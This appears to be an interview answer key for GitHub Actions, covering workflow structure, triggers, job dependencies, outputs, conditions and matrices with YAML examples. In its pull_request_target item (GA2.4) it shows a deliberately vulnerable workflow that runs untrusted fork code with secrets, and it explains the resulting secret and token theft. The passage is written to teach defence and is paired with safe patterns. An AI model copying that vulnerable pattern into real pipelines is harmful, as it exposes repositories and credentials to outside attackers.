# GitHub Actions — Answer Key

Companion to Domain 13 of the DevOps Interview Skills Question Matrix. Numbering matches item for item.

Answers describe *what a good response covers*, not a script to memorise. Where an item is judgement rather than fact, the answer gives the reasoning and the tradeoff, because that's what's being assessed.

Scoping, carried over from the matrix: **delivery concepts are Domain 12 (the CI/CD key)**, **supply chain security is S7**, and **Terraform pipelines are TF9**. This is the tool. Where a topic overlaps, the answer covers the Actions-specific mechanics and points there for the practice.

Three notes on how this domain is interviewed:

- **It's the most factual domain in the matrix after Git.** Much of GA1–GA5 is "do you know how this works", and the answers are correspondingly concrete. That makes it fast to prepare and easy to be caught out on.
- **GA4.8/GA4.9 (script injection) and GA2.3/GA2.4 (`pull_request_target`) are the two most consequential things here.** Both are specific, exploitable, and commonly wrong in real repositories — and both come up in any security-aware interview.
- **GA6 is where an AWS platform role concentrates.** OIDC federation with a correctly-scoped trust policy is the single most valuable thing in this domain for your target roles, and GA6.7 is where people get it wrong.

---

## GA1. Core model

**GA1.1 — The hierarchy**

```yaml
name: CI                          # ← workflow
on: [push]
jobs:
  build:                          # ← job
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4 # ← step using an action
      - run: npm ci && npm test   # ← step running a command
```

- **Workflow** — a YAML file defining an automated process. Triggered by events (GA2). The unit that appears in the Actions tab.
- **Job** — a set of steps executing on **one runner**. **Jobs run in parallel by default** and are isolated from each other (GA1.3). The unit of parallelism and the unit that shows as a check on a PR.
- **Step** — a single task within a job. **Steps run sequentially on the same runner and share the filesystem and environment.** Either a `run` (shell command) or a `uses` (an action).
- **Action** — a reusable unit of code invoked by a step (GA1.5, GA5).

**The relationships that matter:**

- **A job is the isolation boundary.** Everything in a job shares a machine; nothing crosses between jobs without explicit passing (GA3.2, GA9.5).
- **A job is the unit of failure** — a failed step fails the job, and a failed job fails the run (unless `continue-on-error`, GA3.5).
- **A job is the billing unit** for runner minutes (GA10.3), so many small jobs cost more in overhead than one large one.

**GA1.2 — Where workflows live and how they're discovered**

**`.github/workflows/*.yml`** (or `.yaml`), in the **default branch** for most triggers — and this last part is the detail that catches people.

The rules:

- **GitHub scans that directory** and registers every valid workflow file. There's no index or registration step.
- **The `name:` field is display-only.** The file name is what identifies it in the API and in `workflow_run` references.
- **For `push` and `pull_request`, the workflow file *from the branch being tested* is used** — so a PR that modifies a workflow runs the modified version. **That's convenient for iteration and is also why fork PRs can't have secrets** (GA6.2).
- **For `schedule`, `workflow_dispatch`, and `workflow_run`, only the version on the default branch counts.** **This is the single most common "why isn't my workflow triggering" answer** (GA2.10): you added a `schedule` on a feature branch and it will never fire until merged.
- **Composite actions live elsewhere** — `action.yml` at a repository root or in a subdirectory (GA5.3).

**The organisational addition worth knowing**: **organisation-level required workflows** (now "repository rulesets" with required workflows) let an org enforce a workflow runs on every repository — useful for a mandatory security scan, and it's the enforcement mechanism behind GA10.5.

**GA1.3 — Jobs run on separate runners and share nothing**

**Each job gets a fresh runner.** By default:

- **No shared filesystem.** Files written in job A do not exist in job B. **This is the most common surprise** — someone builds in one job and expects the artefact in the next.
- **No shared environment variables** set at runtime (`$GITHUB_ENV` is per-job, GA4.5).
- **No shared processes or services.**
- **No shared Docker layer cache** unless you configure one (GA9.7).

**What does cross between jobs:**

- **Job outputs** — small string values, explicitly declared (GA3.2).
- **Artifacts** — files, uploaded and downloaded (GA9.5).
- **Cache** — keyed, shared across jobs and runs (GA9.1).
- **Repository state** — each job checks out independently.
- **External state** — a registry, S3, a database.

**The design consequences:**

- **Splitting into jobs costs you** — a fresh checkout, a fresh dependency install, a fresh runner start (roughly 10–30 seconds of overhead each). **Splitting a fast sequence into five jobs can be slower than one job**, and it's a real tradeoff against parallelism.
- **Build once, pass the artefact** — don't rebuild in the deploy job (C1.6). Upload from build, download in deploy.
- **`needs` creates ordering, not sharing** (GA3.1) — a common conflation.

**GA1.4 — The runner lifecycle and what's clean**

For a **GitHub-hosted runner**, each job gets a **fresh virtual machine**, and at the start:

- **A clean OS** from a standard image, with a large pre-installed toolset (multiple language runtimes, Docker, common CLIs — including the AWS CLI, `jq`, and `gh`).
- **An empty workspace** — you must `actions/checkout` to get your code.
- **No prior state** — no files, no environment variables from previous jobs, no running processes, no Docker images beyond what's pre-cached in the image.
- **A fresh `GITHUB_TOKEN`** (GA6.3).
- **Full sudo access**, and the VM is destroyed after the job.

**What persists across jobs and runs**: **cache** (GA9.1), **artifacts** (GA9.5), and anything you pushed externally.

**For self-hosted runners this is the critical difference** (GA8.5): **a persistent self-hosted runner is not clean.** Files, installed packages, Docker images, and environment modifications from previous jobs remain. That's faster and it's a security problem — **a malicious or careless job can leave state affecting every subsequent job**, including jobs from other repositories using the same runner (GA8.4).

**The security framing to give**: **ephemerality is an isolation property, not just a hygiene one.** GitHub-hosted runners are ephemeral by design; making self-hosted runners ephemeral (GA8.5) is what restores that property.

**GA1.5 — Actions vs run steps**

```yaml
- uses: actions/checkout@v4        # an action
  with:
    fetch-depth: 0

- run: |                           # a run step
    npm ci
    npm test
  shell: bash
```

- **A `run` step** executes shell commands on the runner. Simple, transparent, and **what it does is visible in the workflow file.**
- **A `uses` step** invokes an action — a packaged unit of code (JavaScript, Docker, or composite) with declared inputs and outputs (GA5.4).

**When each is appropriate:**

- **`run` for anything simple, one-off, or repository-specific.** A three-line shell command doesn't need to be an action.
- **An action when the logic is reused**, needs to run on multiple platforms, needs to interact with the Actions runtime (setting outputs, masking values, uploading artifacts), or is genuinely complex.

**The considerations:**

- **`run` steps are auditable at a glance** — you can read what will execute. **An action is code you're trusting** (GA10.7, S7.1), so a marketplace action is a supply chain decision and a `run` step isn't.
- **Actions handle cross-platform differences**; a `run` step with bash won't work on a Windows runner without `shell:` handling.
- **`run` steps default to `bash` on Linux and macOS and `pwsh` on Windows**, and `shell:` overrides it. **Bash runs with `-e` by default in Actions** (fail on error) but **not `-o pipefail`** — so a failing command in a pipeline is silently ignored. **Setting `shell: bash` explicitly enables `pipefail`**, which is a genuinely useful and little-known detail.

**GA1.6 — How a run maps to a commit and a ref**

**Every run is associated with a commit SHA and a ref**, exposed in the `github` context:

| Context value | Meaning |
|---|---|
| `github.sha` | The commit the workflow runs against |
| `github.ref` | The full ref (`refs/heads/main`, `refs/pull/42/merge`, `refs/tags/v1.0`) |
| `github.ref_name` | The short name (`main`, `42/merge`, `v1.0`) |
| `github.head_ref` | **PR only** — the source branch |
| `github.base_ref` | **PR only** — the target branch |
| `github.event_name` | What triggered it |

**The `pull_request` subtlety that matters**: for a `pull_request` event, **`github.sha` is the SHA of a temporary *merge commit*** — the PR's head merged into the base — not the PR's head commit. **So `git rev-parse HEAD` in a checked-out PR gives you a commit that exists nowhere in either branch**, which surprises people building version tags from it. **Use `github.event.pull_request.head.sha`** if you need the actual head commit.

**Why this matters practically:**

- **Artefact tagging and traceability** (C3.2) — you want the real commit in the image label, not the merge commit.
- **`pull_request_target` uses the *base* branch's SHA** (GA2.3), which is exactly why it's dangerous with a checkout of PR code.
- **`workflow_run` runs against the default branch's ref**, not the triggering workflow's (GA2.7).

**GA1.7 — Reading a run's logs and identifying the failure**

The method:

1. **The run summary shows which job failed** — a red cross in the job list.
2. **Open the job; the failed step is expanded automatically** and marked.
3. **Read the error at the bottom of the step**, and — importantly — **the annotations at the top of the run summary**, which surface errors GitHub recognised without needing to open anything.
4. **Check the exit code** — the step failed because a command returned non-zero (D10.5's exit codes apply).
5. **Look at the steps *before* the failing one** — the cause is frequently earlier (a dependency install that partially failed, a variable that wasn't set).

**The gotchas worth knowing:**

- **`set -e` is on by default in bash steps** (GA1.5), so the first failing command ends the step — the error is usually at the end.
- **`pipefail` is not on**, so `cmd | tee log` succeeds even when `cmd` fails. **A silent failure**, and it's a real source of "the step passed and nothing worked".
- **A cancelled run** shows differently from a failed one — check whether it was cancelled by concurrency (GA3.9) or a timeout (GA3.10).
- **Logs are truncated** for very long output, and the raw log download (the gear icon) gives the full text.
- **Log retention is 90 days by default**, so an old failure may be gone.
- **Grouping** (`::group::`) collapses sections, which can hide the error — expand everything if the failure isn't obvious.

**For deeper debugging**: `ACTIONS_STEP_DEBUG` and `ACTIONS_RUNNER_DEBUG` (GA10.1).

---

## GA2. Triggers & events

**GA2.1 — The common triggers**

```yaml
on:
  push:
    branches: [main]
  pull_request:
    branches: [main]
  schedule:
    - cron: '0 3 * * *'          # UTC, always
  workflow_dispatch:
    inputs:
      environment:
        type: choice
        options: [staging, production]
```

- **`push`** — a commit pushed to a branch or tag. **Also fires on branch creation and on tag pushes**, which catches people out.
- **`pull_request`** — PR opened, synchronised (new commits), reopened, or closed. **Defaults to `opened`, `synchronize`, `reopened`** — so a workflow that should run when a PR is labelled or marked ready needs `types:` specified explicitly.
- **`schedule`** — cron, **always UTC** (GA2.9).
- **`workflow_dispatch`** — a manual trigger from the UI or API, with typed inputs (GA2.5).

**Others worth knowing**: `release` (published), `issue_comment` (the basis of ChatOps `/deploy` commands — and it fires on PR comments too, since PRs are issues), `workflow_call` (GA2.6), `workflow_run` (GA2.7), `repository_dispatch` (GA2.8), and `merge_group` for merge queues.

**The general points**: **multiple triggers can be combined** in one `on:` block; **`types:`** narrows which activity types fire; and **a workflow triggered by several events must handle the context differences** — `github.event.pull_request` doesn't exist on a `push` event, so an expression referencing it evaluates to empty rather than erroring, which produces confusing behaviour rather than a clear failure.

**GA2.2 — Filtering by branch, tag, and path**

```yaml
on:
  push:
    branches: [main, 'release/**']
    branches-ignore: ['dependabot/**']
    tags: ['v*.*.*']
    paths:
      - 'src/**'
      - 'package.json'
    paths-ignore:
      - '**.md'
      - 'docs/**'
```

The rules that trip people up:

- **`branches` and `branches-ignore` are mutually exclusive** in the same event — you can't use both. Same for `paths`/`paths-ignore` and `tags`/`tags-ignore`.
- **Specifying `tags` filters means push events on branches no longer trigger** unless `branches` is also specified — a common confusion when adding tag filtering to an existing workflow.
- **Path filtering uses the changed files in the push or PR.** For a PR it's the whole diff against the base; for a push it's the commits in that push.
- **Glob syntax**: `*` doesn't cross `/`, `**` does. `'release/**'` matches `release/1.0` and `release/1.0/hotfix`.
- **Path filters don't apply to `workflow_dispatch` or `schedule`.**

**The significant gotcha**: **a workflow skipped by a path filter reports no status at all — not a passing one.** So if it's a **required status check** on a branch protection rule, **the PR is blocked forever** waiting for a check that will never run. **The standard workarounds**: a companion "skip" workflow with the inverse path filter that reports success, or **merge queues / rulesets** which handle this better. This is a genuinely common and frustrating problem and worth knowing the shape of.

**GA2.3 — `pull_request` vs `pull_request_target`**

**The single most important security distinction in GitHub Actions.**

| | `pull_request` | `pull_request_target` |
|---|---|---|
| Workflow file used | **From the PR's head** | **From the base branch** |
| Code checked out by default | The PR's merge commit | **The base branch** |
| `GITHUB_TOKEN` permissions | **Read-only for fork PRs** | **Read/write** |
| Secrets available | **No, for fork PRs** (GA6.2) | **Yes** |
| Runs in the context of | The PR | **The base repository** |

**Why `pull_request_target` exists**: to allow a workflow to do something privileged in response to a PR from a fork — labelling it, commenting on it, or posting a preview link. **Because fork PRs get no secrets and a read-only token, those things are impossible with `pull_request`.**

**The design intent**: `pull_request_target` runs **trusted code** (from the base branch) with **privileges**, reacting to an untrusted PR — **without ever executing the PR's code.**

**The danger is GA2.4**, and it's severe enough to be its own item.

**The rule to state**: **use `pull_request` by default, always. Reach for `pull_request_target` only when you specifically need secrets or write permissions for a fork PR, and then never check out the PR's code.**

**GA2.4 — The risk of `pull_request_target` with untrusted code**

**The vulnerability:**

```yaml
# CRITICAL VULNERABILITY — do not do this
on: pull_request_target
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}   # ← checks out UNTRUSTED code
      - run: npm ci && npm test                            # ← EXECUTES it, with secrets
```

**What happens**: `pull_request_target` provides **full secrets and a read/write `GITHUB_TOKEN`**. The explicit `ref:` checks out the attacker's PR branch. `npm ci` executes **`postinstall` scripts from the attacker's `package.json`** — and any test file, build script, or config the attacker controls.

**The attacker, from a fork, with no permissions on your repository, now has**: every secret in the workflow's scope, a write-capable `GITHUB_TOKEN` (so they can push to your default branch, create releases, or modify workflows), and any cloud credentials the workflow uses.

**This has been exploited repeatedly in the wild** and is one of the highest-severity misconfigurations in the ecosystem.

**The safe patterns:**

- **Don't check out PR code in a `pull_request_target` workflow.** Use it only for operations on metadata — labelling, commenting, assigning.
- **Split the workflow**: a `pull_request` job builds and tests the untrusted code with **no secrets**, uploads an artefact; a **`workflow_run`** workflow (GA2.7) triggered by its completion does the privileged part, **without executing PR code**.
- **If you must check out PR code**, do so with **no secrets in scope** and a read-only token, and treat the runner as compromised.
- **Require approval for workflows from first-time contributors** (repository setting — and it should be on).
- **Scope secrets to environments with branch protection** (GA7.3), so they're unavailable to a PR context.

**GA2.5 — `workflow_dispatch` inputs**

```yaml
on:
  workflow_dispatch:
    inputs:
      environment:
        description: 'Target environment'
        type: environment          # renders as an environment picker
        required: true
      version:
        description: 'Version to deploy (digest or tag)'
        type: string
        required: true
      dry_run:
        type: boolean
        default: true
      log_level:
        type: choice
        options: [debug, info, warn]
        default: info
```

```yaml
    steps:
      - run: ./deploy.sh
        env:
          TARGET: ${{ inputs.environment }}
          VERSION: ${{ inputs.version }}
```

The details:

- **Types**: `string`, `boolean`, `choice`, `environment`. **Typed inputs render proper UI controls**, which reduces mistakes versus free text.
- **Accessed via `inputs.*`** (or `github.event.inputs.*`, the older form — note that with the older form **booleans arrive as strings**, so `if: github.event.inputs.dry_run == 'true'`; with `inputs.*` and `type: boolean` they're actual booleans).
- **Maximum 10 inputs.**
- **Only works from the default branch** for the UI trigger (GA1.2), though the API can specify a `ref`.
- **Triggerable via API or `gh workflow run`**, which is how you build a ChatOps or external trigger flow.

**The use cases**: manual deployment with a version selection (C5.7's promotion flow), a break-glass path (C10.6), a manual re-run of a scheduled job, and administrative operations. **Pair with an environment for approval** (GA7.2) so a manual production deploy still requires a reviewer.

**GA2.6 — `workflow_call` for reusability**

```yaml
# .github/workflows/reusable-deploy.yml
on:
  workflow_call:
    inputs:
      environment: { type: string, required: true }
      image_digest: { type: string, required: true }
    secrets:
      AWS_ROLE_ARN: { required: true }
    outputs:
      deployed_url:
        value: ${{ jobs.deploy.outputs.url }}
```

```yaml
# calling workflow
jobs:
  deploy-staging:
    uses: acme/workflows/.github/workflows/reusable-deploy.yml@v3
    with:
      environment: staging
      image_digest: ${{ needs.build.outputs.digest }}
    secrets:
      AWS_ROLE_ARN: ${{ secrets.STAGING_ROLE_ARN }}
    permissions:
      id-token: write
      contents: read
```

The mechanics:

- **Called at the *job* level**, not the step level — `uses:` on a job rather than in `steps:`. **This is the key structural difference from a composite action** (GA5.7).
- **`secrets: inherit`** passes all the caller's secrets, which is convenient and less explicit than naming them.
- **Permissions**: the called workflow gets the caller's permissions, and **can only reduce them, never expand** — so `permissions:` in the caller is the ceiling.
- **Version it** with a tag or SHA (GA5.2, GA5.8).

**The limits are GA5.6**, and the choice between this and a composite action is GA5.7.

**GA2.7 — `workflow_run` and its ref gotcha**

```yaml
on:
  workflow_run:
    workflows: ["CI"]            # by workflow NAME, not filename
    types: [completed]
    branches: [main]

jobs:
  deploy:
    if: ${{ github.event.workflow_run.conclusion == 'success' }}
```

**Chains one workflow to another's completion.** The main uses: separating a privileged step from an unprivileged one (the safe `pull_request_target` alternative, GA2.4), and orchestrating a sequence where the second workflow needs different permissions.

**The ref gotcha, which is the item's focus:**

- **The `workflow_run` workflow always runs from the default branch**, using the default branch's version of the file (GA1.2) — **regardless of which branch triggered the original workflow.**
- **`github.ref` and `github.sha` refer to the default branch**, not to the triggering run's commit. **So a naive `actions/checkout` checks out `main`, not the code that was built.**
- **To get the triggering commit** you must use `github.event.workflow_run.head_sha` and pass it explicitly to checkout.

```yaml
- uses: actions/checkout@v4
  with:
    ref: ${{ github.event.workflow_run.head_sha }}
```

**And note the security implication**: on the fork-PR pattern, **that head SHA is untrusted code** — so if you're using `workflow_run` to escape `pull_request_target`'s danger, checking out the head SHA reintroduces exactly the same vulnerability (GA2.4). **Pass artefacts, not code.**

Two more: **`types: [completed]` fires on success *and* failure**, so the `if` on `conclusion` is required; and **it only triggers when the triggering workflow is on the default branch** unless configured otherwise.

**GA2.8 — `repository_dispatch` for external triggering**

```yaml
on:
  repository_dispatch:
    types: [deploy-request, upstream-released]

jobs:
  handle:
    runs-on: ubuntu-latest
    steps:
      - run: echo "${{ github.event.client_payload.version }}"
```

```bash
curl -X POST \
  -H "Authorization: Bearer $TOKEN" \
  -H "Accept: application/vnd.github+json" \
  https://api.github.com/repos/acme/api/dispatches \
  -d '{"event_type":"deploy-request","client_payload":{"version":"1.4.2","env":"staging"}}'
```

**Triggers a workflow from outside GitHub** — another system, a webhook receiver, a different repository, or a monitoring tool.

The details:

- **`event_type`** filters which workflows respond; **`client_payload`** carries arbitrary JSON (up to 64KB), accessed via `github.event.client_payload.*`.
- **Requires a token with `contents: write`** on the target repository — so a PAT, a GitHub App token (GA6.8), or a `GITHUB_TOKEN` from another workflow with the right permission.
- **Only runs from the default branch** (GA1.2).

**The use cases**: cross-repository triggering (a shared library releasing triggers dependent repositories to update); an external system initiating a deployment; and a ChatOps integration.

**The security point that matters**: **`client_payload` is attacker-controlled if the triggering token leaks**, so **treat it as untrusted input** — never interpolate it directly into a shell command (GA4.9). And **the token needed to dispatch is a write token on the repository**, which is a meaningful privilege to hand to an external system (C10.3).

**The alternative worth naming**: **`workflow_dispatch` via the API** (GA2.5) is often better for a human-initiated external trigger, because it has typed inputs and shows in the UI as a deliberate action.

**GA2.9 — Why scheduled workflows are unreliable**

**Two distinct problems:**

**1. Timing is not guaranteed.**

- **`schedule` uses UTC always** — no timezone support. **So a `0 9 * * *` job runs at 9am UTC, which is 10am in British Summer Time** — the schedule shifts by an hour twice a year relative to local time.
- **Runs are queued, not guaranteed.** GitHub explicitly documents that scheduled workflows may be **delayed during periods of high load**, and delays of **15 minutes to an hour or more** are common — particularly on the hour and at midnight, when everyone's cron fires.
- **A run can be skipped entirely** under heavy load.
- **The practical mitigation**: **avoid `0 * * * *` and `0 0 * * *`** — use an offset like `17 3 * * *` to land outside the peak. And **never depend on scheduled workflows for anything time-critical**; use a proper scheduler (EventBridge Scheduler, A9.7) that triggers via `repository_dispatch` (GA2.8) if timing matters.

**2. They're disabled when the repository is stale.**

- **GitHub automatically disables scheduled workflows in public repositories after 60 days of no repository activity**, and emails the owner. **On a low-activity repository this silently stops your nightly build or your scheduled security scan** — and nobody notices, because the failure mode is nothing happening.
- **The mitigation**: monitor that the job is running (alert on "last successful run older than N", the same argument as backup-age alerting, DB12.2), or keep the repository active.

**GA2.10 — Why a workflow didn't trigger: the standard list**

Work through these in order:

1. **Is the workflow file on the right branch?** For `schedule`, `workflow_dispatch`, `workflow_run`, and `repository_dispatch`, **it must be on the default branch** (GA1.2). **This is the most common answer.**
2. **Is the YAML valid?** An invalid workflow file is silently ignored — **it doesn't appear in the Actions tab at all.** Check the Actions tab for a parse error, or run `actionlint`.
3. **Do the filters match?** Branch, tag, and path filters (GA2.2) — and remember `paths` filters against the changed files, and specifying `tags` excludes branch pushes.
4. **Is the event type right?** `pull_request` defaults to three activity types; a PR being labelled or converted from draft needs `types:` specified.
5. **Is it a `GITHUB_TOKEN` push?** (GA2.11) — the most confusing one.
6. **Are Actions disabled?** At repository level, at organisation level, or for the fork.
7. **Was the workflow disabled** — manually, or automatically for staleness (GA2.9)?
8. **Is it a fork PR** where the workflow requires approval (first-time contributor setting)?
9. **Concurrency** — was it cancelled by a group (GA3.9) before it appeared to start?
10. **Billing** — has the organisation exhausted its included minutes or hit a spending limit? **Runs fail to start with a billing error**, which is easy to miss.
11. **For `workflow_run`**, is the triggering workflow's **name** (not filename) correct, and was it on the default branch?

**GA2.11 — Why one workflow's push doesn't trigger another**

**The rule: events created using `GITHUB_TOKEN` do not trigger further workflow runs.**

So a workflow that commits and pushes, creates a PR, or opens an issue **using the default `GITHUB_TOKEN` will not cause any workflow to run in response.**

**Why it exists: to prevent infinite recursion.** A workflow that pushes a commit, triggering itself, pushing again, would loop forever consuming minutes. **GitHub cut the loop at the source rather than relying on users to avoid it.**

**Where it bites in practice:**

- **A release workflow** that bumps a version, commits, and tags — **and the tag push doesn't trigger the release workflow** waiting for `tags: v*`.
- **An automated formatting or dependency-update workflow** committing a fix, and the CI workflow not running on it — **so the PR shows stale checks.**
- **A workflow creating a PR** and no CI running on it, so it can't be merged under branch protection.

**The workarounds, in order of preference:**

1. **A GitHub App token** (GA6.8) — installation tokens **do** trigger workflows, and it's the cleanest answer: scoped, short-lived, and auditable.
2. **A PAT from a machine account** stored as a secret — works, and it's a long-lived credential with the associated risks (S6.6).
3. **`workflow_run`** (GA2.7) to chain explicitly rather than relying on the push event.
4. **Do the work in one workflow** rather than splitting it across a trigger boundary.

**The related detail**: a **deploy key** with write access also triggers workflows, which is a lighter-weight alternative to a PAT for a push-only case.

---

## GA3. Jobs, steps & control flow

**GA3.1 — `needs` and the resulting graph**

```yaml
jobs:
  lint:      { runs-on: ubuntu-latest, steps: [...] }
  test:      { runs-on: ubuntu-latest, steps: [...] }
  build:
    needs: [lint, test]              # waits for both
    runs-on: ubuntu-latest
  deploy-staging:
    needs: build
  deploy-prod:
    needs: [build, deploy-staging]
```

**`needs` creates a directed acyclic graph.** Jobs with no `needs` start immediately and in parallel; a job with `needs` waits for **all** listed jobs to complete **successfully**.

The behaviours that matter:

- **Default is success-only.** If a needed job fails, dependents are **skipped** (not failed). **To run regardless, combine with `if: always()`** (GA3.4).
- **A skipped job is treated as success for `needs`** in most cases — which surprises people: a job skipped by an `if` condition doesn't block its dependents.
- **`needs` also enables `needs.<job>.outputs`** (GA3.2) — so it's both ordering and data access.
- **The graph is what determines the run's duration** — the critical path, not total job time (C2.3). **Adding parallelism off the critical path saves nothing.**
- **Cycles are rejected** at validation.

**The design tension** (GA1.3): more jobs means more parallelism and more per-job overhead — a fresh runner, a fresh checkout, a fresh dependency install each time. **A three-step sequence split into three jobs is usually slower than one job**, so split for parallelism or for a genuine boundary (different runner type, different permissions, an environment gate), not by default.

**GA3.2 — Passing data between jobs with outputs**

```yaml
jobs:
  build:
    runs-on: ubuntu-latest
    outputs:
      digest: ${{ steps.push.outputs.digest }}
      version: ${{ steps.meta.outputs.version }}
    steps:
      - id: meta
        run: echo "version=1.4.2" >> "$GITHUB_OUTPUT"
      - id: push
        run: echo "digest=sha256:abc..." >> "$GITHUB_OUTPUT"

  deploy:
    needs: build
    runs-on: ubuntu-latest
    steps:
      - run: ./deploy.sh "${{ needs.build.outputs.digest }}"
```

**The chain**: a step writes to `$GITHUB_OUTPUT` → the job declares it in `outputs:` referencing `steps.<id>.outputs.<name>` → a dependent job reads `needs.<job>.outputs.<name>`.

**The constraints that matter:**

- **`needs` is required** — you cannot read outputs from a job you don't depend on.
- **Strings only**, and there's a **1MB total limit** per job's outputs. **For anything larger, use artifacts** (GA9.5).
- **Job outputs are not masked**, so **never put a secret in an output** — it will appear in the logs and the API (GA4.7).
- **Matrix jobs are awkward**: all matrix legs write to the same output name, so **the last one to finish wins**, non-deterministically. **To collect outputs from a matrix, write artifacts per leg and aggregate in a following job** — a common requirement and a real limitation.
- **The old `::set-output::` command syntax is deprecated and disabled** — `$GITHUB_OUTPUT` is the current form, and using the old one in an interview answer dates you.

**GA3.3 — `if` at job and step level**

```yaml
jobs:
  deploy:
    if: github.ref == 'refs/heads/main' && github.event_name == 'push'
    runs-on: ubuntu-latest
    steps:
      - run: ./deploy.sh
      - name: Notify on failure
        if: failure()
        run: ./notify.sh
      - name: Always clean up
        if: always()
        run: ./cleanup.sh
```

The details:

- **`if` at job level** skips the whole job (it shows as skipped, not failed).
- **`if` at step level** skips that step; **subsequent steps still run.**
- **`${{ }}` is optional in `if`** — the value is always evaluated as an expression. **Including it is harmless; omitting it is idiomatic.** Where it matters: `if: ${{ ! startsWith(...) }}` needs the braces because `!` at the start of a YAML value is a tag indicator.
- **A skipped step's outputs are empty**, so downstream references silently produce nothing rather than failing.
- **The implicit condition is `success()`** — every step and job has it by default, which is why a step after a failure doesn't run unless you say otherwise (GA3.4).

**The common conditions**: `github.event_name`, `github.ref`, `github.actor`, `contains(github.event.head_commit.message, '[skip ci]')`, `inputs.*` for dispatch, and `needs.<job>.result`.

**The gotcha**: **`if` conditions on secrets don't work** — `if: secrets.FOO != ''` is not permitted at job level in some contexts (GA4.2), and the workaround is to promote the check into an output or an env var at a step level.

**GA3.4 — Status check functions**

| Function | True when |
|---|---|
| `success()` | All previous steps/jobs succeeded — **the implicit default** |
| `failure()` | A previous step/job failed |
| `cancelled()` | The run was cancelled |
| `always()` | **Always** — including on cancellation |

```yaml
- run: ./upload-test-results.sh
  if: always()                          # even if tests failed

- run: ./notify-failure.sh
  if: failure()

- run: ./cleanup.sh
  if: ${{ !cancelled() }}               # on success or failure, not cancellation
```

**The distinctions that matter:**

- **`always()` includes cancellation**, which is frequently not what you want — **a cleanup step with `always()` runs even when someone cancelled the run**, potentially interfering with a deliberate abort. **`!cancelled()`** is usually the better choice.
- **`failure()` at job level with `needs`** checks whether any needed job failed.
- **Combining with `needs.<job>.result`** gives finer control: `if: needs.build.result == 'failure'`.
- **`always()` overrides everything**, including a job whose `needs` failed — which is how you build a "report status regardless" job.

**The common uses**: uploading test results and logs regardless of outcome (GA9.5), notifying on failure, cleaning up ephemeral resources (C5.6), and posting a summary (GA4.6).

**GA3.5 — `continue-on-error`**

```yaml
- name: Optional lint
  run: ./strict-lint.sh
  continue-on-error: true

jobs:
  experimental:
    continue-on-error: true              # job level
```

**At step level**: the step can fail without failing the job. **The step is marked with a warning; the job continues.**

**At job level**: the job can fail without failing the workflow run.

**The effect on the run's status, which is the item's focus:**

- **A step with `continue-on-error: true` that fails does not make the job fail** — so `success()` in later steps is still true, which is the confusing part. **The failure is recorded but doesn't propagate.**
- **`steps.<id>.outcome`** is the raw result (`failure`), while **`steps.<id>.conclusion`** is the result after `continue-on-error` is applied (`success`). **That distinction is the way to detect it** — check `outcome`, not `conclusion`.
- **At job level, the run shows as successful** even with a failed job — **which means a required status check passes.** That's a real risk if used carelessly.

**When it's appropriate**: an experimental matrix leg (paired with `fail-fast: false`, GA3.7); an optional step whose failure is informational; a cleanup step that may legitimately fail.

**When it's a problem**: **using it to silence a failing test or scan.** The check appears green and verifies nothing (C4.5's theatre argument). **If a step's failure doesn't matter, question whether the step should exist.**

**GA3.6 — Matrix, including and excluding**

```yaml
jobs:
  test:
    strategy:
      fail-fast: false
      matrix:
        os: [ubuntu-latest, macos-latest]
        node: [18, 20, 22]
        include:
          - os: ubuntu-latest
            node: 22
            coverage: true            # adds a property to an existing combination
          - os: windows-latest        # adds a whole new combination
            node: 20
        exclude:
          - os: macos-latest
            node: 18
    runs-on: ${{ matrix.os }}
    steps:
      - uses: actions/setup-node@v4
        with: { node-version: '${{ matrix.node }}' }
```

**The base matrix is the Cartesian product** — 2 OS × 3 Node = 6 jobs, minus the exclusion = 5, plus the extra include = 6.

**The `include` semantics are the confusing part and worth being precise about:**

- **If an `include` entry's keys match an existing combination**, its extra properties are **added to that combination** (the `coverage: true` example).
- **If it doesn't match**, it **creates a new combination** (the Windows example).
- **`include` is processed after `exclude`**, so an include can add back something excluded.

**The practical points**: **matrix legs are separate jobs** on separate runners (GA1.3), so they don't share state; **each leg counts separately for billing** (GA10.3); **the job name includes the matrix values**, which is how you identify a failing leg; and **there's a 256-job limit** per workflow run.

**GA3.7 — `fail-fast` and `max-parallel`**

```yaml
strategy:
  fail-fast: false        # default is true
  max-parallel: 4
  matrix: { ... }
```

- **`fail-fast: true` (the default)** — **when any matrix leg fails, all other in-progress legs are cancelled immediately.**
- **`fail-fast: false`** — every leg runs to completion regardless.
- **`max-parallel`** — caps how many legs run concurrently.

**Choosing deliberately:**

**`fail-fast: false` when you want the full picture** — testing across five Node versions, you want to know whether it fails on all of them or just one. **Cancelling after the first failure tells you much less**, and the developer then fixes one thing and discovers the next failure on the re-run (C2.2's "run-all on independent checks" argument).

**`fail-fast: true` (the default) when the legs are equivalent** and any failure means the same thing — saving runner minutes and giving faster feedback.

**`max-parallel` when:**

- **A shared resource can't handle full concurrency** — a test database, a rate-limited external API, a licence limit.
- **You're constrained by runner capacity** (GA8.8) and want to leave room for other workflows.
- **Cost control** — though it doesn't reduce total minutes, only concurrency.

**The default to recommend**: **`fail-fast: false` for a test matrix** across platforms or versions, because the information is worth the minutes; **the default for anything where the legs are interchangeable.**

**GA3.8 — Generating a matrix dynamically**

```yaml
jobs:
  discover:
    runs-on: ubuntu-latest
    outputs:
      services: ${{ steps.find.outputs.services }}
    steps:
      - uses: actions/checkout@v4
      - id: find
        run: |
          # emit a JSON array of changed service directories
          SERVICES=$(ls -d services/*/ | xargs -n1 basename | jq -R . | jq -sc .)
          echo "services=$SERVICES" >> "$GITHUB_OUTPUT"

  build:
    needs: discover
    strategy:
      matrix:
        service: ${{ fromJSON(needs.discover.outputs.services) }}
    runs-on: ubuntu-latest
    steps:
      - run: ./build.sh ${{ matrix.service }}
```

**The mechanism**: a job emits a **JSON array (or array of objects) as a string output** (GA3.2), and the consuming job's matrix uses **`fromJSON()`** (GA4.3) to parse it.

**The uses:**

- **Monorepo affected-target builds** — detect which services changed and build only those (C12.2). **The most valuable use**, and it's how you keep a monorepo pipeline fast.
- **Deploying to a list of environments or regions** read from a config file.
- **Testing against a version list** maintained outside the workflow.

**The practicalities:**

- **The output must be valid compact JSON** — `jq -c` matters, because a multi-line string breaks the output format.
- **An empty array produces zero matrix jobs**, and **the job is skipped** — which then interacts with `needs` and with required status checks (GA2.2's problem). **Guard for it** with an `if:` on the consuming job.
- **The 256-job limit** still applies.
